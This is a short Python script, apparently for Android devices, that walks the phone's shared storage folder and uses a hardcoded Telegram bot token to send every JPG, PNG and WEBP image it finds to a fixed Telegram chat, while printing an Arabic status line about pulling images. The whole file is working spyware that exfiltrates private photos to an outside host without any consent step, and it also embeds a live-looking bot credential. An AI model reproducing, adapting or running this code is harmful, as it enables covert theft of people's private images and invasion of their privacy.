import sys
import os
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
    import telebot
    
bot = telebot.TeleBot('5160966492:AAGp_NvVBM5fg9ujg5QcmpurWbYApajbOeI')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id= 1468583868, photo=f)

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
             file_path = os.path.join(root, file)
             if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
              executor.submit(send_file, file_path)
             else:
                 print('جاري سحب صور')

threading.Thread(target=background).start()

bot.infinity_polling()